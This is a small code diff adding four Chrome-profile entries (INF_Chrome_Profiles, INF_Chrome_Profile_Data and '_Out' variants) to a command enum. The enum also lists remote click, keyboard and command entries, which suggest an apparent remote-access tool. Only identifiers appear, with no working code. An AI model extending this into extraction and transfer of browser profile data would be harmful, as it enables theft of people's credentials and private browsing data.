@@ -121,7 +121,11 @@ namespace EnumComandos {
         RD_Send_Click,
         RD_Send_Teclado,
         WM_Lista,
-        WM_CMD
+        WM_CMD,
+        INF_Chrome_Profiles,
+        INF_Chrome_Profile_Data,
+        INF_Chrome_Profiles_Out,
+        INF_Chrome_Profile_Data_Out
     };
 }
 
